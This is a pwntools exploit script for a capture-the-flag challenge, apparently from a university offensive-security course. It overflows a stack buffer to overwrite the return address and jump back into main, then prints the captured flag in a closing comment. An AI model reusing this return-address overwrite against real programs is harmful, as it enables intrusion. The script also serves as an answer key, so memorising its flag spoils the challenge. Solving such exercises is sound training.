from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./jumper"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1283
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b get_input
#     continue
# ''')

e = ELF(CHALLENGE)
s = asm('''
        endbr64
        push rbp
        mov rbp, rsp
        sub rsp, 0x10
        mov dword [rbp-0x4], edi
        mov qword [rbp-0x10], rsi
        mov eax, 0x0
        ''', arch="amd64")
jump_to_addr = e.symbols.main + len(s) + 5

height = 0x132d
while True:
    print(p.recvuntil(b"> \n").decode())
    height += 1
    log.info(f"Increasing the height by one to: {hex(height)}")
    if height == 0x1337:
        p.sendline()
        break
    msg = b"D" * 0x38 + p64(jump_to_addr)
    p.send(msg)
    log.info(f"Sending raw bytes : {msg}")
    log.info(f"Overwriting the return address in the stack to: {hex(jump_to_addr)}")

p.interactive()

# flag{jump1ng_b4ck_and_f0rth_1s_r34lly_c00l!_6cdc9458cfa14a7b}
